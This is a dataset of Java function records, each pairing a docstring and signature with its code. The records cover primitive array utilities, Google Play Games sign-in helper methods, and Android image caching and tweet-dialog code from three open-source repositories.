{"docstring": "/**\n * Returns the values from each provided array combined into a single array.\n * For example, {@code concat(new char[] {a, b}, new char[] {}, new\n * char[] {c}} returns the array {@code {a, b, c}}.\n *\n * @param arrays zero or more {@code char} arrays\n * @return a single array containing all the values from the source arrays, in\n *     order\n */\n", "func_signal": "public static char[] concat(char[]... arrays)", "code": "{\n  int length = 0;\n  for (char[] array : arrays) {\n    length += array.length;\n  }\n  char[] result = new char[length];\n  int pos = 0;\n  for (char[] array : arrays) {\n    System.arraycopy(array, 0, result, pos, array.length);\n    pos += array.length;\n  }\n  return result;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Chars.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Returns the least value present in {@code array}.\n *\n * @param array a <i>nonempty</i> array of {@code char} values\n * @return the value present in {@code array} that is less than or equal to\n *     every other value in the array\n * @throws IllegalArgumentException if {@code array} is empty\n */\n", "func_signal": "public static char min(char... array)", "code": "{\n  char min = array[0];\n  for (int i = 1; i < array.length; i++) {\n    if (array[i] < min) {\n      min = array[i];\n    }\n  }\n  return min;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Chars.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Returns a fixed-size list backed by the specified array, similar to {@link\n * java.util.Arrays#asList(Object[])}. The list supports {@link java.util.List#set(int, Object)},\n * but any attempt to set a value to {@code null} will result in a {@link\n * NullPointerException}.\n *\n * <p>The returned list maintains the values, but not the identities, of\n * {@code Character} objects written to or read from it.  For example, whether\n * {@code list.get(0) == list.get(0)} is true for the returned list is\n * unspecified.\n *\n * @param backingArray the array to back the list\n * @return a list view of the array\n */\n", "func_signal": "public static List<Character> asList(char... backingArray)", "code": "{\n  if (backingArray.length == 0) {\n    return Collections.emptyList();\n  }\n  return new CharArrayAsList(backingArray);\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Chars.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "// Arrays.copyOf() requires Java 6\n", "func_signal": "private static char[] copyOf(char[] original, int length)", "code": "{\n  char[] copy = new char[length];\n  System.arraycopy(original, 0, copy, 0, Math.min(original.length, length));\n  return copy;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Chars.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Returns an array containing each value of {@code collection}, converted to\n * a {@code int} value in the manner of {@link Number#intValue}.\n *\n * <p>Elements are copied from the argument collection as if by {@code\n * collection.toArray()}.  Calling this method is as thread-safe as calling\n * that method.\n *\n * @param collection a collection of {@code Number} instances\n * @return an array containing the same values as {@code collection}, in the\n *     same order, converted to primitives\n * @throws NullPointerException if {@code collection} or any of its elements\n *     is null\n */\n", "func_signal": "public static int[] toArray(Collection<? extends Number> collection)", "code": "{\n  if (collection instanceof IntArrayAsList) {\n    return ((IntArrayAsList) collection).toIntArray();\n  }\n\n  Object[] boxedArray = collection.toArray();\n  int len = boxedArray.length;\n  int[] array = new int[len];\n  for (int i = 0; i < len; i++) {\n    array[i] = ((Number)boxedArray[i]).intValue();\n  }\n  return array;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Ints.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "// TODO(kevinb): consider making this public\n", "func_signal": "private static int indexOf(\n    char[] array, char target, int start, int end)", "code": "{\n  for (int i = start; i < end; i++) {\n    if (array[i] == target) {\n      return i;\n    }\n  }\n  return -1;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Chars.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "// TODO(kevinb): consider making this public\n", "func_signal": "private static int lastIndexOf(\n    char[] array, char target, int start, int end)", "code": "{\n  for (int i = end - 1; i >= start; i--) {\n    if (array[i] == target) {\n      return i;\n    }\n  }\n  return -1;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Chars.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Returns an array containing the same values as {@code array}, but\n * guaranteed to be of a specified minimum length. If {@code array} already\n * has a length of at least {@code minLength}, it is returned directly.\n * Otherwise, a new array of size {@code minLength + padding} is returned,\n * containing the values of {@code array}, and zeroes in the remaining places.\n *\n * @param array the source array\n * @param minLength the minimum length the returned array must guarantee\n * @param padding an extra amount to \"grow\" the array by if growth is\n *     necessary\n * @throws IllegalArgumentException if {@code minLength} or {@code padding} is\n *     negative\n * @return an array containing the values of {@code array}, with guaranteed\n *     minimum length {@code minLength}\n */\n", "func_signal": "public static int[] ensureCapacity(\n    int[] array, int minLength, int padding)", "code": "{\n  return (array.length < minLength)\n      ? copyOf(array, minLength + padding)\n      : array;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Ints.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "// TODO(kevinb): consider making this public\n", "func_signal": "private static int lastIndexOf(\n    int[] array, int target, int start, int end)", "code": "{\n  for (int i = end - 1; i >= start; i--) {\n    if (array[i] == target) {\n      return i;\n    }\n  }\n  return -1;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Ints.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "//    @Test\n", "func_signal": "public void basicFlowForReplace()", "code": "{\n        Foo foo = new Foo(\"\");\n//        assertThat(foo.check(false), is(-1L));\n        LambdaByteDSL.INSTANCE.<Long>replace(foo::check0)\n                .by(() -> System.currentTimeMillis());\n        //or\n        LambdaByteDSL.INSTANCE.<Foo,Long>replace(Foo::check0)\n           .by((_this) -> System.currentTimeMillis());\n\n//        LambdaByteDSL.INSTANCE_FOR_CONSUMER.<Foo, String>replace(Foo::printWith)\n//                .by((Foo _this, String s) -> System.out.println() );\n\n//        assertThat( foo.check(false)-System.currentTimeMillis(), lessThan(new Long(10000L)) );\n//        assertThat( foo.check(true) -System.currentTimeMillis(), lessThan(new Long(10000L)) );\n//        idea: findWriteTo, findCallTo(::)\n//                .findReadto()\n//                .after()\n//                .ins(NOP)\n//                .code(()-> System.out.println(\"lambdabyte!\"));\n    }", "path": "landz.lambdabyte.tests\\src\\z\\lambdabyte\\DSLTest.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Performs setup on this GameHelper object. Call this from the onCreate()\n * method of your Activity. This will create the clients and do a few other\n * initialization tasks. Next, call @link{#onStart} from the onStart()\n * method of your Activity.\n *\n * @param listener\n *            The listener to be notified of sign-in events.\n */\n", "func_signal": "public void setup(GameHelperListener listener)", "code": "{\n    if (mSetupDone) {\n        String error = \"GameHelper: you cannot call GameHelper.setup() more than once!\";\n        logError(error);\n        throw new IllegalStateException(error);\n    }\n    mListener = listener;\n    debugLog(\"Setup: requested clients: \" + mRequestedClients);\n\n    if (mGoogleApiClientBuilder == null) {\n        // we don't have a builder yet, so create one\n        createApiClientBuilder();\n    }\n\n    mGoogleApiClient = mGoogleApiClientBuilder.build();\n    mGoogleApiClientBuilder = null;\n    mSetupDone = true;\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/** Called when we are disconnected from the Google API client. */\n", "func_signal": "@Override\npublic void onConnectionSuspended(int cause)", "code": "{\n    debugLog(\"onConnectionSuspended, cause=\" + cause);\n    disconnect();\n    mSignInFailureReason = null;\n    debugLog(\"Making extraordinary call to onSignInFailed callback\");\n    mConnecting = false;\n    notifyListener(false);\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Sets the options to pass when setting up the AppState API. Call before\n * setup().\n */\n", "func_signal": "public void setAppStateApiOptions(NoOptions options)", "code": "{\n    doApiOptionsPreCheck();\n    mAppStateApiOptions = options;\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Returns the invitation received through an invitation notification. This\n * should be called from your GameHelperListener's\n *\n * @link{GameHelperListener#onSignInSucceeded method, to check if there's an\n *                                            invitation available. In that\n *                                            case, accept the invitation.\n * @return The invitation, or null if none was received.\n */\n", "func_signal": "public Invitation getInvitation()", "code": "{\n    if (!mGoogleApiClient.isConnected()) {\n        Log.w(TAG,\n                \"Warning: getInvitation() should only be called when signed in, \"\n                        + \"that is, after getting onSignInSuceeded()\");\n    }\n    return mInvitation;\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Disconnects the API client, then connects again.\n */\n", "func_signal": "public void reconnectClient()", "code": "{\n    if (!mGoogleApiClient.isConnected()) {\n        Log.w(TAG, \"reconnectClient() called when client is not connected.\");\n        // interpret it as a request to connect\n        connect();\n    } else {\n        debugLog(\"Reconnecting client.\");\n        mGoogleApiClient.reconnect();\n    }\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Returns the invitation ID received through an invitation notification.\n * This should be called from your GameHelperListener's\n *\n * @link{GameHelperListener#onSignInSucceeded method, to check if there's an\n *                                            invitation available. In that\n *                                            case, accept the invitation.\n * @return The id of the invitation, or null if none was received.\n */\n", "func_signal": "public String getInvitationId()", "code": "{\n    if (!mGoogleApiClient.isConnected()) {\n        Log.w(TAG,\n                \"Warning: getInvitationId() should only be called when signed in, \"\n                        + \"that is, after getting onSignInSuceeded()\");\n    }\n    return mInvitation == null ? null : mInvitation.getInvitationId();\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Returns the tbmp match received through an invitation notification. This\n * should be called from your GameHelperListener's\n *\n * @link{GameHelperListener#onSignInSucceeded method, to check if there's a\n *                                            match available.\n * @return The match, or null if none was received.\n */\n", "func_signal": "public TurnBasedMatch getTurnBasedMatch()", "code": "{\n    if (!mGoogleApiClient.isConnected()) {\n        Log.w(TAG,\n                \"Warning: getTurnBasedMatch() should only be called when signed in, \"\n                        + \"that is, after getting onSignInSuceeded()\");\n    }\n    return mTurnBasedMatch;\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Starts a user-initiated sign-in flow. This should be called when the user\n * clicks on a \"Sign In\" button. As a result, authentication/consent dialogs\n * may show up. At the end of the process, the GameHelperListener's\n * onSignInSucceeded() or onSignInFailed() methods will be called.\n */\n", "func_signal": "public void beginUserInitiatedSignIn()", "code": "{\n    debugLog(\"beginUserInitiatedSignIn: resetting attempt count.\");\n    resetSignInCancellations();\n    mSignInCancelled = false;\n    mConnectOnStart = true;\n\n    if (mGoogleApiClient.isConnected()) {\n        // nothing to do\n        logWarn(\"beginUserInitiatedSignIn() called when already connected. \"\n                + \"Calling listener directly to notify of success.\");\n        notifyListener(true);\n        return;\n    } else if (mConnecting) {\n        logWarn(\"beginUserInitiatedSignIn() called when already connecting. \"\n                + \"Be patient! You can only call this method after you get an \"\n                + \"onSignInSucceeded() or onSignInFailed() callback. Suggestion: disable \"\n                + \"the sign-in button on startup and also when it's clicked, and re-enable \"\n                + \"when you get the callback.\");\n        // ignore call (listener will get a callback when the connection\n        // process finishes)\n        return;\n    }\n\n    debugLog(\"Starting USER-INITIATED sign-in flow.\");\n\n    // indicate that user is actively trying to sign in (so we know to\n    // resolve\n    // connection problems by showing dialogs)\n    mUserInitiatedSignIn = true;\n\n    if (mConnectionResult != null) {\n        // We have a pending connection result from a previous failure, so\n        // start with that.\n        debugLog(\"beginUserInitiatedSignIn: continuing pending sign-in flow.\");\n        mConnecting = true;\n        resolveConnectionResult();\n    } else {\n        // We don't have a pending connection result, so start anew.\n        debugLog(\"beginUserInitiatedSignIn: starting new sign-in flow.\");\n        mConnecting = true;\n        connect();\n    }\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Handle activity result. Call this method from your Activity's\n * onActivityResult callback. If the activity result pertains to the sign-in\n * process, processes it appropriately.\n */\n", "func_signal": "public void onActivityResult(int requestCode, int responseCode,\n                             Intent intent)", "code": "{\n    debugLog(\"onActivityResult: req=\"\n            + (requestCode == RC_RESOLVE ? \"RC_RESOLVE\" : String\n            .valueOf(requestCode)) + \", resp=\"\n            + GameHelperUtils.activityResponseCodeToString(responseCode));\n    if (requestCode != RC_RESOLVE) {\n        debugLog(\"onActivityResult: request code not meant for us. Ignoring.\");\n        return;\n    }\n\n    // no longer expecting a resolution\n    mExpectingResolution = false;\n\n    if (!mConnecting) {\n        debugLog(\"onActivityResult: ignoring because we are not connecting.\");\n        return;\n    }\n\n    // We're coming back from an activity that was launched to resolve a\n    // connection problem. For example, the sign-in UI.\n    if (responseCode == Activity.RESULT_OK) {\n        // Ready to try to connect again.\n        debugLog(\"onAR: Resolution was RESULT_OK, so connecting current client again.\");\n        connect();\n    } else if (responseCode == GamesActivityResultCodes.RESULT_RECONNECT_REQUIRED) {\n        debugLog(\"onAR: Resolution was RECONNECT_REQUIRED, so reconnecting.\");\n        connect();\n    } else if (responseCode == Activity.RESULT_CANCELED) {\n        // User cancelled.\n        debugLog(\"onAR: Got a cancellation result, so disconnecting.\");\n        mSignInCancelled = true;\n        mConnectOnStart = false;\n        mUserInitiatedSignIn = false;\n        mSignInFailureReason = null; // cancelling is not a failure!\n        mConnecting = false;\n        mGoogleApiClient.disconnect();\n\n        // increment # of cancellations\n        int prevCancellations = getSignInCancellations();\n        int newCancellations = incrementSignInCancellations();\n        debugLog(\"onAR: # of cancellations \" + prevCancellations + \" --> \"\n                + newCancellations + \", max \" + mMaxAutoSignInAttempts);\n\n        notifyListener(false);\n    } else {\n        // Whatever the problem we were trying to solve, it was not\n        // solved. So give up and show an error message.\n        debugLog(\"onAR: responseCode=\"\n                + GameHelperUtils\n                .activityResponseCodeToString(responseCode)\n                + \", so giving up.\");\n        giveUp(new SignInFailureReason(mConnectionResult.getErrorCode(),\n                responseCode));\n    }\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/** Sign out and disconnect from the APIs. */\n", "func_signal": "public void signOut()", "code": "{\n    if (!mGoogleApiClient.isConnected()) {\n        // nothing to do\n        debugLog(\"signOut: was already disconnected, ignoring.\");\n        return;\n    }\n\n    // for Plus, \"signing out\" means clearing the default account and\n    // then disconnecting\n    if (0 != (mRequestedClients & CLIENT_PLUS)) {\n        debugLog(\"Clearing default account on PlusClient.\");\n        Plus.AccountApi.clearDefaultAccount(mGoogleApiClient);\n    }\n\n    // For the games client, signing out means calling signOut and\n    // disconnecting\n    if (0 != (mRequestedClients & CLIENT_GAMES)) {\n        debugLog(\"Signing out from the Google API Client.\");\n        Games.signOut(mGoogleApiClient);\n    }\n\n    // Ready to disconnect\n    debugLog(\"Disconnecting client.\");\n    mConnectOnStart = false;\n    mConnecting = false;\n    mGoogleApiClient.disconnect();\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/** Called when we successfully obtain a connection to a client. */\n", "func_signal": "@Override\npublic void onConnected(Bundle connectionHint)", "code": "{\n    debugLog(\"onConnected: connected!\");\n\n    if (connectionHint != null) {\n        debugLog(\"onConnected: connection hint provided. Checking for invite.\");\n        Invitation inv = connectionHint\n                .getParcelable(Multiplayer.EXTRA_INVITATION);\n        if (inv != null && inv.getInvitationId() != null) {\n            // retrieve and cache the invitation ID\n            debugLog(\"onConnected: connection hint has a room invite!\");\n            mInvitation = inv;\n            debugLog(\"Invitation ID: \" + mInvitation.getInvitationId());\n        }\n\n        // Do we have any requests pending?\n        mRequests = Games.Requests\n                .getGameRequestsFromBundle(connectionHint);\n        if (!mRequests.isEmpty()) {\n            // We have requests in onConnected's connectionHint.\n            debugLog(\"onConnected: connection hint has \" + mRequests.size()\n                    + \" request(s)\");\n        }\n\n        debugLog(\"onConnected: connection hint provided. Checking for TBMP game.\");\n        mTurnBasedMatch = connectionHint\n                .getParcelable(Multiplayer.EXTRA_TURN_BASED_MATCH);\n    }\n\n    // we're good to go\n    succeedSignIn();\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Returns the GoogleApiClient object. In order to call this method, you\n * must have called @link{setup}.\n */\n", "func_signal": "public GoogleApiClient getApiClient()", "code": "{\n    if (mGoogleApiClient == null) {\n        throw new IllegalStateException(\n                \"No GoogleApiClient. Did you call setup()?\");\n    }\n    return mGoogleApiClient;\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/** Enables debug logging */\n", "func_signal": "public void enableDebugLog(boolean enabled)", "code": "{\n    mDebugLog = enabled;\n    if (enabled) {\n        debugLog(\"Debug log enabled.\");\n    }\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "// Not recommended for general use. This method forces the\n// \"connect on start\" flag\n// to a given state. This may be useful when using GameHelper in a\n// non-standard\n// sign-in flow.\n", "func_signal": "public void setConnectOnStart(boolean connectOnStart)", "code": "{\n    debugLog(\"Forcing mConnectOnStart=\" + connectOnStart);\n    mConnectOnStart = connectOnStart;\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Sets the options to pass when setting up the Plus API. Call before\n * setup().\n */\n", "func_signal": "public void setPlusApiOptions(PlusOptions options)", "code": "{\n    doApiOptionsPreCheck();\n    mPlusApiOptions = options;\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Construct a GameHelper object, initially tied to the given Activity.\n * After constructing this object, call @link{setup} from the onCreate()\n * method of your Activity.\n *\n * @param clientsToUse\n *            the API clients to use (a combination of the CLIENT_* flags,\n *            or CLIENT_ALL to mean all clients).\n */\n", "func_signal": "public GameHelper(Activity activity, int clientsToUse)", "code": "{\n    mActivity = activity;\n    mAppContext = activity.getApplicationContext();\n    mRequestedClients = clientsToUse;\n    mHandler = new Handler();\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/** Shows an error dialog that's appropriate for the failure reason. */\n", "func_signal": "public static void showFailureDialog(Activity activity, int actResp,\n                                     int errorCode)", "code": "{\n    if (activity == null) {\n        Log.e(\"GameHelper\", \"*** No Activity. Can't show failure dialog!\");\n        return;\n    }\n    Dialog errorDialog = null;\n\n    switch (actResp) {\n        case GamesActivityResultCodes.RESULT_APP_MISCONFIGURED:\n            errorDialog = makeSimpleDialog(activity, GameHelperUtils.getString(\n                    activity, GameHelperUtils.R_APP_MISCONFIGURED));\n            break;\n        case GamesActivityResultCodes.RESULT_SIGN_IN_FAILED:\n            errorDialog = makeSimpleDialog(activity, GameHelperUtils.getString(\n                    activity, GameHelperUtils.R_SIGN_IN_FAILED));\n            break;\n        case GamesActivityResultCodes.RESULT_LICENSE_FAILED:\n            errorDialog = makeSimpleDialog(activity, GameHelperUtils.getString(\n                    activity, GameHelperUtils.R_LICENSE_FAILED));\n            break;\n        default:\n            // No meaningful Activity response code, so generate default Google\n            // Play services dialog\n            errorDialog = GooglePlayServicesUtil.getErrorDialog(errorCode,\n                    activity, RC_UNUSED, null);\n            if (errorDialog == null) {\n                // get fallback dialog\n                Log.e(\"GameHelper\",\n                        \"No standard error dialog available. Making fallback dialog.\");\n                errorDialog = makeSimpleDialog(\n                        activity,\n                        GameHelperUtils.getString(activity,\n                                GameHelperUtils.R_UNKNOWN_ERROR)\n                                + \" \"\n                                + GameHelperUtils.errorCodeToString(errorCode));\n            }\n    }\n\n    errorDialog.show();\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/** Handles a connection failure. */\n", "func_signal": "@Override\npublic void onConnectionFailed(ConnectionResult result)", "code": "{\n    // save connection result for later reference\n    debugLog(\"onConnectionFailed\");\n\n    mConnectionResult = result;\n    debugLog(\"Connection failure:\");\n    debugLog(\"   - code: \"\n            + GameHelperUtils.errorCodeToString(mConnectionResult\n            .getErrorCode()));\n    debugLog(\"   - resolvable: \" + mConnectionResult.hasResolution());\n    debugLog(\"   - details: \" + mConnectionResult.toString());\n\n    int cancellations = getSignInCancellations();\n    boolean shouldResolve = false;\n\n    if (mUserInitiatedSignIn) {\n        debugLog(\"onConnectionFailed: WILL resolve because user initiated sign-in.\");\n        shouldResolve = true;\n    } else if (mSignInCancelled) {\n        debugLog(\"onConnectionFailed WILL NOT resolve (user already cancelled once).\");\n        shouldResolve = false;\n    } else if (cancellations < mMaxAutoSignInAttempts) {\n        debugLog(\"onConnectionFailed: WILL resolve because we have below the max# of \"\n                + \"attempts, \"\n                + cancellations\n                + \" < \"\n                + mMaxAutoSignInAttempts);\n        shouldResolve = true;\n    } else {\n        shouldResolve = false;\n        debugLog(\"onConnectionFailed: Will NOT resolve; not user-initiated and max attempts \"\n                + \"reached: \"\n                + cancellations\n                + \" >= \"\n                + mMaxAutoSignInAttempts);\n    }\n\n    if (!shouldResolve) {\n        // Fail and wait for the user to want to sign in.\n        debugLog(\"onConnectionFailed: since we won't resolve, failing now.\");\n        mConnectionResult = result;\n        mConnecting = false;\n        notifyListener(false);\n        return;\n    }\n\n    debugLog(\"onConnectionFailed: resolving problem...\");\n\n    // Resolve the connection result. This usually means showing a dialog or\n    // starting an Activity that will allow the user to give the appropriate\n    // consents so that sign-in can be successful.\n    resolveConnectionResult();\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Creates a GoogleApiClient.Builder for use with @link{#setup}. Normally,\n * you do not have to do this; use this method only if you need to make\n * nonstandard setup (e.g. adding extra scopes for other APIs) on the\n * GoogleApiClient.Builder before calling @link{#setup}.\n */\n", "func_signal": "public GoogleApiClient.Builder createApiClientBuilder()", "code": "{\n    if (mSetupDone) {\n        String error = \"GameHelper: you called GameHelper.createApiClientBuilder() after \"\n                + \"calling setup. You can only get a client builder BEFORE performing setup.\";\n        logError(error);\n        throw new IllegalStateException(error);\n    }\n\n    GoogleApiClient.Builder builder = new GoogleApiClient.Builder(\n            mActivity, this, this);\n\n    if (0 != (mRequestedClients & CLIENT_GAMES)) {\n        builder.addApi(Games.API, mGamesApiOptions);\n        builder.addScope(Games.SCOPE_GAMES);\n    }\n\n    if (0 != (mRequestedClients & CLIENT_PLUS)) {\n        builder.addApi(Plus.API, mPlusApiOptions);\n        builder.addScope(Plus.SCOPE_PLUS_LOGIN);\n    }\n\n    if (0 != (mRequestedClients & CLIENT_APPSTATE)) {\n        builder.addApi(AppStateManager.API);\n        builder.addScope(AppStateManager.SCOPE_APP_STATE);\n    }\n\n    mGoogleApiClientBuilder = builder;\n    return builder;\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/** Call this method from your Activity's onStop(). */\n", "func_signal": "public void onStop()", "code": "{\n    debugLog(\"onStop\");\n    assertConfigured(\"onStop\");\n    if (mGoogleApiClient.isConnected()) {\n        debugLog(\"Disconnecting client due to onStop\");\n        mGoogleApiClient.disconnect();\n    } else {\n        debugLog(\"Client already disconnected when we got onStop.\");\n    }\n    mConnecting = false;\n    mExpectingResolution = false;\n\n    // let go of the Activity reference\n    mActivity = null;\n}", "path": "BaseGameUtils\\src\\com\\google\\example\\games\\basegameutils\\GameHelper.java", "repo_name": "TheInvader360/libgdx-gameservices-tutorial", "stars": 102, "license": "None", "language": "java", "size": 13051}
{"docstring": "/**\n * Initializes the disk cache when is closed or null.\n * \n * @param context the application context.\n */\n", "func_signal": "private static void intDiskCacheIfNeeded(Context context)", "code": "{\n    if (DISK_CACHE == null || DISK_CACHE.isClosed()) {\n        try {\n            long size = 1024 * 1024 * 10;\n            String cachePath = \n                    Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState()) || Files.isExternalStorageRemovable()\n                    ? Files.getExternalCacheDir(context).getPath() \n                    : context.getCacheDir().getPath();\n            File file = new File(cachePath + File.separator + IMAGE_CACHE_DIR);\n            DISK_CACHE = DiskLruCache.open(file, 1, 1, size); // Froyo sometimes fails to initialize\n        } catch (IOException ex) {\n            Log.e(TAG, \"Couldn't init disk cache\", ex);\n        }\n    }\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/** Sets up the tweet button view. */\n", "func_signal": "private void setUpTweetButton()", "code": "{\n    tweetButton.setEnabled(false);\n    tweetButton.setOnClickListener(new View.OnClickListener() {\n        \n        @Override\n        public void onClick(View view) {\n            if (Resources.isConnectedToInternet(getContext())) {\n                twitter.updateStatus(tweetEditText.getText().toString());\n                hideSoftKeyboard();\n                dismiss();\n            } else {\n                Toast.makeText(getContext().getApplicationContext(),\n                        R.string.twitt4droid_is_offline_messege,\n                        Toast.LENGTH_LONG).show();\n            }\n        }\n    });\n}", "path": "library\\src\\com\\twitt4droid\\widget\\TweetDialog.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Sets the color resource to use when the ImageView is loading.\n * \n * @param loadingColorId an ImageView.\n * @return this ImageLoader.\n */\n", "func_signal": "public ImageLoader setLoadingColorId(int loadingColorId)", "code": "{\n    this.loadingColorId = loadingColorId;\n    return this;\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Sets the ImageView to use.\n * \n * @param imageView an ImageView.\n * @return this ImageLoader.\n */\n", "func_signal": "public ImageLoader setImageView(ImageView imageView)", "code": "{\n    this.imageView = imageView;\n    return this;\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Creates a TweetDialog.\n * \n * @param context the Context in which the Dialog should run.\n */\n", "func_signal": "public TweetDialog(Context context)", "code": "{\n    super(context);\n    init();\n}", "path": "library\\src\\com\\twitt4droid\\widget\\TweetDialog.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
{"docstring": "/**\n * Gets a bitmap, if exists, from the given url and stores in both memory cache and disk cache.\n * \n * @param context the application context.\n * @param url an url.\n * @return a bitmap or {@code null}.\n */\n", "func_signal": "public static Bitmap getFromUrl(Context context, String url)", "code": "{\n    String key = buildKey(url);\n    Bitmap cachedBitmap = getFromCache(context, key);\n    if (cachedBitmap != null) return cachedBitmap;\n    \n    try {\n        InputStream stream = new URL(url).openConnection().getInputStream();\n        Bitmap downloaded = BitmapFactory.decodeStream(stream);\n        saveInCache(context, key, downloaded);\n        return downloaded;\n    } catch (MalformedURLException ex) {\n        Log.e(TAG, \"Invalid url \" + url, ex);\n    } catch (IOException ex) {\n        // Useless for now\n    }\n    \n    return null;\n}", "path": "library\\src\\com\\twitt4droid\\util\\Images.java", "repo_name": "dan-zx/twitt4droid", "stars": 82, "license": "apache-2.0", "language": "java", "size": 6288}
